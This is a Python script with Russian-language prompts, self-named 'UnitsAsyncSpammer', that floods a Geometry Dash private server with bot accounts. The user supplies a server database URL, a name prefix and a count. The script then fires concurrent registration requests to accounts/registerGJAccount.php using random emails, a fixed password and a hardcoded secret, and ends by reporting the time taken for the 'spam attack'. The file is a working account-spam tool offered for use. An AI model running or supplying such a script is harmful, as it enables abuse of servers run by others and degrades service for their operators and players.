import aiohttp
import requests
import random
import string
import asyncio
import time
from colorama import init, Fore
import urllib

init()

async def CreateAccount(Username):
    Letters = string.ascii_lowercase
    Email = ''.join(random.choice(Letters) for i in range(12))
    Password = "GDPSMOMENTSPAMMER"
    RandomString = str(random.randint(1, 99999999))
    UserName = Username + RandomString
    Database = DataBase
    data = {
        'userName': UserName,
        'password': Password,
        'email': Email + "@" + "Gmail.com",
        'secret': "Wmfd2893gb7"
    }
    Headers = {'User-Agent': ''}
    async with aiohttp.ClientSession() as session:
        RequestRegister = await session.post(Database+"accounts/registerGJAccount.php", data=data, headers=Headers)
        Info = "Аккаунт был успешно зарегестрирован с именем " + UserName + " И с почта:пароль " + Email + "@" + "Gmail.com" + ":" + str(Password)
        print(Info)

async def main(username, uses: int):
    global start_time
    start_time = time.time()

    tasks = [asyncio.ensure_future(CreateAccount(username)) for _ in range(1, uses)]

    Spam = await asyncio.gather(*tasks)

global Uses
print(Fore.YELLOW + "Вы используете UnitsAsyncSpammer")

DataBase = input(Fore.GREEN + "Введите ссылку на Базу Данных Сервера : ")

if not DataBase.strip():
    print(Fore.RED + "Ошибка введёного значения (Вы ничего не ввели)")
else:
    UserName = input(Fore.GREEN + "Кастомное имя ботов : ")
    if not UserName.strip():
        print(Fore.RED + "Ошибка введёного значения (Вы ничего не ввели)")
    else:
        try:
            Uses = int(input(Fore.GREEN + "Сколько будет ботов : "))
            asyncio.run(main(UserName, Uses))
            print(Fore.GREEN + "--- %s Секунд ---" % (time.time() - start_time) + "--- Понадобилось для Спам-Аттаки ---")
        except ValueError:
            print(Fore.RED + "Вы ввели не число")